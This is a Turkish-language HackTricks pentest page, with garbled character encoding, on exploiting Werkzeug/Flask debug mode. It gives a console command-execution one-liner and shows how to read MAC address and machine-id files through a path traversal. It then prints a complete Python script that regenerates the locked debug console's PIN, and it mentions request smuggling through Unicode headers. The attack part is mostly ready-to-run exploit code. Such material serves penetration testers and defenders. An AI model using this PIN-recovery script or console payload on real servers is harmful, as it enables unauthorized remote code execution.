# Werkzeug / Flask Hata AyÄ±klama

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI'na**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR gÃ¶ndererek HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**AnÄ±nda kullanÄ±labilir zafiyet deÄŸerlendirme ve penetrasyon testi kurulumu**. 20'den fazla araÃ§ ve Ã¶zellikle her yerden tam bir pentest Ã§alÄ±ÅŸtÄ±rÄ±n, keÅŸiften raporlamaya kadar uzanan. Pentester'larÄ± deÄŸiÅŸtirmiyoruz - Ã¶zel araÃ§lar, tespit ve istismar modÃ¼lleri geliÅŸtiriyoruz, bÃ¶ylece daha derine inmek, kabuklarÄ± patlatmak ve eÄŸlenmek iÃ§in zaman kazanÄ±yorlar.

{% embed url="https://pentest-tools.com/" %}

## Konsol RCE

Hata ayÄ±klama etkinse `/console`'a eriÅŸmeyi deneyebilir ve RCE elde edebilirsiniz.
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (117).png>)

Ä°nternette [bu](https://github.com/its-arun/Werkzeug-Debug-RCE) gibi birkaÃ§ aÃ§Ä±k bulunmaktadÄ±r veya metasploit'te bir tane.

## Pin KorumalÄ± - Yol GeÃ§iÅŸi

BazÄ± durumlarda **`/console`** ucu bir pin ile korunabilir. EÄŸer bir **dosya geÃ§iÅŸi aÃ§Ä±ÄŸÄ±**nÄ±z varsa, o pin'i oluÅŸturmak iÃ§in gerekli tÃ¼m bilgileri sÄ±zdÄ±rabilirsiniz.

### Werkzeug Console PIN SÄ±zma AÃ§Ä±ÄŸÄ±

Uygulamada bir hata sayfasÄ± oluÅŸturarak bunu gÃ¶rÃ¼ntÃ¼leyin:
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
### Konsol Kilitli Senaryosu

Werkzeug'in hata ayÄ±klama arayÃ¼zÃ¼ne eriÅŸmeye Ã§alÄ±ÅŸÄ±rken "konsol kilitli" senaryosuyla karÅŸÄ±laÅŸÄ±lÄ±r ve konsolu kilidini aÃ§mak iÃ§in bir PIN gerektiÄŸi belirtilir. Werkzeug'Ä±n hata ayÄ±klama baÅŸlatma dosyasÄ±ndaki (`__init__.py`) PIN oluÅŸturma algoritmasÄ±nÄ± analiz ederek konsol PIN'ini sÃ¶mÃ¼rme Ã¶nerilir. PIN oluÅŸturma mekanizmasÄ± [**Werkzeug kaynak kodu deposundan**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py) incelenebilir, ancak olasÄ± sÃ¼rÃ¼m farklÄ±lÄ±klarÄ± nedeniyle gerÃ§ek sunucu kodunu dosya gezintisi aÃ§Ä±ÄŸÄ± aracÄ±lÄ±ÄŸÄ±yla temin etmek tavsiye edilir.

Konsol PIN'ini sÃ¶mÃ¼rmek iÃ§in `probably_public_bits` ve `private_bits` olmak Ã¼zere iki set deÄŸiÅŸkene ihtiyaÃ§ vardÄ±r:

#### **`probably_public_bits`**

* **`username`**: Flask oturumunu baÅŸlatan kullanÄ±cÄ±yÄ± ifade eder.
* **`modname`**: Genellikle `flask.app` olarak belirlenir.
* **`getattr(app, '__name__', getattr(app.__class__, '__name__'))`**: Genellikle **Flask**'a Ã§Ã¶zÃ¼mlenir.
* **`getattr(mod, '__file__', None)`**: Flask dizinindeki `app.py`'nin tam yolunu temsil eder (Ã¶rneÄŸin, `/usr/local/lib/python3.5/dist-packages/flask/app.py`). `app.py` uygun deÄŸilse, **`app.pyc`** deneyin.

#### **`private_bits`**

* **`uuid.getnode()`**: GeÃ§erli makinenin MAC adresini alÄ±r ve `str(uuid.getnode())` ile onu ondalÄ±k formata Ã§evirir.
* **Sunucunun MAC adresini belirlemek iÃ§in, uygulama tarafÄ±ndan kullanÄ±lan etkin aÄŸ arabirimini tanÄ±mlamak gerekir (Ã¶rneÄŸin, `ens3`). Belirsiz durumlarda, cihaz kimliÄŸini bulmak iÃ§in **`/proc/net/arp`'yi sÄ±zdÄ±rÄ±n**, ardÄ±ndan **MAC adresini** **`/sys/class/net/<cihaz kimliÄŸi>/address`**'den Ã§Ä±karÄ±n.
*   Bir onaltÄ±lÄ±k MAC adresini ondalÄ±k formata dÃ¶nÃ¼ÅŸtÃ¼rme aÅŸaÄŸÄ±daki gibi gerÃ§ekleÅŸtirilebilir:

```python
# Ã–rnek MAC adresi: 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```
* **`get_machine_id()`**: `/etc/machine-id` veya `/proc/sys/kernel/random/boot_id` ile `/proc/self/cgroup`'Ä±n son eÄŸik Ã§izgisinden sonraki ilk satÄ±rÄ±nÄ± birleÅŸtirir.
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

Gerekli tÃ¼m veriler toplandÄ±ktan sonra, aÃ§Ä±klayÄ±cÄ± betik yÃ¼rÃ¼tÃ¼lerek Werkzeug konsolu PIN'i oluÅŸturulabilir. Betik, birleÅŸtirilmiÅŸ `probably_public_bits` ve `private_bits` kullanarak bir karmayÄ± oluÅŸturur, ardÄ±ndan bu karmadan geÃ§erek nihai PIN Ã¼retilir. AÅŸaÄŸÄ±da bu iÅŸlemi yÃ¼rÃ¼tmek iÃ§in Python kodu bulunmaktadÄ±r:
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',  # username
'flask.app',  # modname
'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
Bu betik, bitlerin birleÅŸtirilmesiyle PIN'i oluÅŸturur, belirli tuzlar (`cookiesalt` ve `pinsalt`) ekler ve Ã§Ä±ktÄ±yÄ± biÃ§imlendirir. Ãœretilen PIN'in Werkzeug konsolu tarafÄ±ndan beklenen PIN ile eÅŸleÅŸmesini saÄŸlamak iÃ§in `probably_public_bits` ve `private_bits` iÃ§in gerÃ§ek deÄŸerlerin hedef sistemden doÄŸru bir ÅŸekilde alÄ±nmasÄ± Ã¶nemlidir.

{% hint style="success" %}
EÄŸer Werkzeug'in **eski bir sÃ¼rÃ¼mÃ¼nde** iseniz, **sha1** yerine **md5 karma algoritmasÄ±nÄ±** denemeyi dÃ¼ÅŸÃ¼nebilirsiniz.
{% endhint %}

## Werkzeug Unicode karakterleri

[**Bu sorunda**](https://github.com/pallets/werkzeug/issues/2833) gÃ¶zlemlendiÄŸi gibi, Werkzeug baÅŸlÄ±kta Unicode karakterleri olan bir isteÄŸi kapatmaz. Ve [**bu yazÄ±da**](https://mizu.re/post/twisty-python) aÃ§Ä±klandÄ±ÄŸÄ± gibi, bu bir CL.0 Ä°stek KaÃ§Ä±rma zafiyetine neden olabilir.

Bu, Werkzeug'de bazÄ± **Unicode** karakterlerinin gÃ¶nderilebilmesinin ve sunucunun **Ã§Ã¶kmesine** neden olabileceÄŸinin mÃ¼mkÃ¼n olmasÄ±dÄ±r. Ancak, eÄŸer HTTP baÄŸlantÄ±sÄ± **`Connection: keep-alive`** baÅŸlÄ±ÄŸÄ± ile oluÅŸturulmuÅŸsa, isteÄŸin gÃ¶vdesi okunmayacak ve baÄŸlantÄ± hala aÃ§Ä±k kalacaktÄ±r, bu nedenle isteÄŸin **gÃ¶vdesi** bir sonraki HTTP isteÄŸi olarak iÅŸleme alÄ±nacaktÄ±r.

## Referanslar

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)
* [**https://github.com/pallets/werkzeug/issues/2833**](https://github.com/pallets/werkzeug/issues/2833)
* [**https://mizu.re/post/twisty-python**](https://mizu.re/post/twisty-python)

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**AnÄ±nda kullanÄ±labilir zayÄ±flÄ±k deÄŸerlendirme ve penetrasyon testi kurulumu**. 20'den fazla araÃ§ ve Ã¶zellikle tam bir pentest Ã§alÄ±ÅŸtÄ±rÄ±n, keÅŸiften raporlamaya kadar uzanan Ã¶zelliklerle. Pentester'larÄ± deÄŸiÅŸtirmiyoruz - onlara daha derinlemesine kazmak, kabuklar aÃ§mak ve eÄŸlenmek iÃ§in biraz zaman kazandÄ±rmak iÃ§in Ã¶zel araÃ§lar, tespit ve istismar modÃ¼lleri geliÅŸtiriyoruz.

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* **ğŸ’¬ Discord grubuna** **katÄ±lÄ±n**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'u takip edin**.
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± gÃ¶ndererek HackTricks ve HackTricks Cloud** github depolarÄ±na PR'lar gÃ¶ndererek paylaÅŸÄ±n.

</details>
